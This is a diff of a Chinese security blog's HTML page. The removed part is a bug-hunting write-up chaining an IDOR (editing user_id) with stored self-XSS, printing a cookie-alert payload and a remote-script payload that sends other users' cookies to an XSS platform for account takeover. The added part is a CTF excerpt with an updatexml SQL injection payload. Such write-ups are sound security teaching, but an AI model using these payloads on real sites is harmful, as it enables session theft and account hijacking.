@@ -22,7 +22,7 @@
     <meta name="description" content="信息安全技术博客">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>记一次漏洞组合拳-水平越权+Self XSS漏洞 · c1ay&#39;s blog</title>
+    <title>c1ay&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,23 +203,12 @@
 </head>
 
     
-        <body class="post-body">
-    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/" >c1ay&#39;s blog</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">记一次漏洞组合拳-水平越权+Self XSS漏洞</a>
-            </div>
-    </div>
     
     <a class="home-link" href=/>c1ay's blog</a>
 </header>
@@ -231,74 +220,24 @@
 
 
 
-
-height:50vh;
 ">
     
     <!-- 主页  -->
-    
-    
-    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-            记一次漏洞组合拳-水平越权+Self XSS漏洞
-            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-            
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class= post-intro-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞挖掘">漏洞挖掘</a>
-    
-</div>
-                
-                
-                    <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">762</span>Reading time: <span class="post-count reading-time">2 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/08/08</span>
-                    
-                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                        <span class="iconfont-archer">&#xe602;</span>
-                        <span id="busuanzi_value_page_pv"></span>
-                    </span>
-                    
-                    <span class="shareWrapper">
-                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
-                        <span class="shareText">Share</span>
-                        <ul class="shareList">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -399,72 +338,47 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main post-page">
-    <article class="article-entry">
-        <h1 id="记一次漏洞组合拳-水平越权-Self-XSS漏洞"><a href="#记一次漏洞组合拳-水平越权-Self-XSS漏洞" class="headerlink" title="记一次漏洞组合拳-水平越权+Self XSS漏洞"></a>记一次漏洞组合拳-水平越权+Self XSS漏洞</h1><p><strong>在一次漏洞挖掘当中，发现在用户中心设置信息的位置存在存储型xss漏洞，尝试新增常用联系人，在详细地址的位置插入xss的payload，可以发现成功弹出了Cookie</strong></p>
-<p><img src="http://pic.c1imber.top/blog/180808/2h2EHIHFCF.png?imageslim" alt="mark"></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>
-<p><img src="http://pic.c1imber.top/blog/180808/8mLLkI6508.png?imageslim" alt="mark"></p>
-<p><strong>但是此处有可能只是一个selfxss，如果只是能打到自己的cookie，那么这个存储型xss就会显得很鸡肋。但是这个网站存在一个越权添加个人信息的漏洞，越权的漏洞之前也提交过一次，在添加的时候通过修改user_id可以越权将信息添加到其它用户里，在这里可以利用越权漏洞将xsspayload插入其他用户的个人中心里去扩大这个selfxss的危害,简单来说就是利用越权添加和selfxss的组合拳增加这个selfxss的危害，这样就可以打到其他用户的cookie</strong></p>
-<p><strong>还是之前测试越权的两个账号</strong></p>
-<pre><code>用户A（格鲁特）   id：112054
-用户B（火箭）   id：112069
-</code></pre><p><strong>首先在A的个人中心中添加常用联系人，之前说了在详细地址处存在存储型xss，这里插入加载远程js的xsspayload，同时使用xss平台接收信息</strong></p>
-<p><strong>xsspayload：</strong></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script src=xss平台上的远程脚本&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure>
-<p><strong>之后抓包，数据包里有个参数为user_id，这个参数可控，导致可以越权</strong><br><img src="http://pic.c1imber.top/blog/180808/8DCH9k5D1l.png?imageslim" alt="mark"></p>
-<p><strong>修改数据包中的user_id,尝试将此条包含xsspayload的信息越权添加到其他用户的个人信息中，如果成功，那么其他用户在登陆后查看时就会触发xss代码加载远程脚本，将用户的cookie打到我们的xss平台上，这里将user_id改为用户B的id（112069）</strong></p>
-<p><img src="http://pic.c1imber.top/blog/180808/7A8I50Gb0d.png?imageslim" alt="mark"></p>
-<p><strong>可以看到添加成功，但是在当前的账号上看不到刚刚添加的信息</strong></p>
-<p><strong>然后使用用户B登陆，可以看到包含xsspayload的信息是否已经被越权添加到用户B的常用信息中,可以看到用户B在登陆后查看联系人信息时我们的xss平台就能接收到该用户的cookie</strong><br><img src="http://pic.c1imber.top/blog/180808/6D023iAEL1.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180808/EcL0eeimml.png?imageslim" alt="mark"></p>
-<p><strong>接下来将获取到的用户B的cookie替换为用户A的cookie，可以看到成功登陆到了用户B的账号</strong><br><img src="http://pic.c1imber.top/blog/180808/EB6Lga9LI4.png?imageslim" alt="mark"></p>
-<p><strong>而且user_id只有6位数，是可以遍历的，如果遍历了所有的uid，那么就可以打到所有用户的cookie，所以漏洞的危害还是非常大的，所以通过selfxss+水平越权两个低危漏洞组合就可以变成一个影响严重的高危漏洞</strong></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>这是我在漏洞挖掘中遇到的一个比较有意思的组合利用，在漏洞挖掘中，遇到低危漏洞时，不要急着提交，先看看有没有可以扩大其危害的漏洞，可以尝试组合利用一下，会有意想不到的惊喜</strong></p>
-
-    </article>
-    <!-- license  -->
+            <main class="main index-page">
     
-        <div class="license-wrapper">
-            <p>Author：<a href="https://c1aysec.github.io">c1ay</a>
-            <p>原文链接：<a href="https://c1aysec.github.io/2018/08/08/记一次漏洞组合拳-水平越权+Self XSS漏洞/">https://c1aysec.github.io/2018/08/08/记一次漏洞组合拳-水平越权+Self XSS漏洞/</a>
-            <p>发表日期：<a href="https://c1aysec.github.io/2018/08/08/记一次漏洞组合拳-水平越权+Self XSS漏洞/">August 8th 2018, 12:26:51 am</a>
-            <p>更新日期：<a href="https://c1aysec.github.io/2018/08/08/记一次漏洞组合拳-水平越权+Self XSS漏洞/">November 8th 2019, 10:23:47 pm</a>
-            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2020/12/07/2020全国电信和互联网行业网络安全竞赛wp/" >
+            
+                <span>2020全国电信和互联网行业网络安全竞赛wp</span>
+        </a>
+        <div class="abstract-content">
+            序补一下，11月份的比赛，太忙一直没时间更新
+easy_sql很明显的注入，但是过滤了一些关键字，比如information、sys等，导致获取不到表名
+通过：
+uname=1&apos;) and updatexml(1,concat(0x3a,(select * from flag)),1);-- -&amp;passwd=1
+可以发现存在名为flag表，并且可以获取到里面的数据
+
+但是updatexml这种报错注入方式显示的信息有长度限制，而且这里不知道flag表当中flag的列名，关于无列名注入的问题，直接用子查询就能绕过
+获取完整的flag:
+uname=1&apos;) an...
         </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/12/07</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+</div>
+            
+        </div>
+    </article>
     
     <!-- paginator  -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/08/17/解决ubuntu任务计划写shell失败的问题/" title= "解决ubuntu任务计划写shell失败的问题">
-                    <div class="nextTitle">解决ubuntu任务计划写shell失败的问题</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/07/17/Linux下几种反弹shell方法的总结与理解/" title= "Linux下几种反弹shell方法的总结与理解">
-                    <div class="prevTitle">Linux下几种反弹shell方法的总结与理解</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-<!-- City版安装代码已完成 -->
     
-    
-    <!-- partial('_partial/comment/changyan') -->
-    <!--PC版-->
-
-
-    
-    
-
-    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -545,24 +459,6 @@ height:50vh;
 </footer>
     </div>
     <!-- toc -->
-    
-    <div class="toc-wrapper" style=
-    
-
-
-
-
-
-
-
-top:50vh;
-
-    >
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#记一次漏洞组合拳-水平越权-Self-XSS漏洞"><span class="toc-number">1.</span> <span class="toc-text">记一次漏洞组合拳-水平越权+Self XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">1.0.1.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li></ol>
-    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1766,8 +1662,6 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
-    
-        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
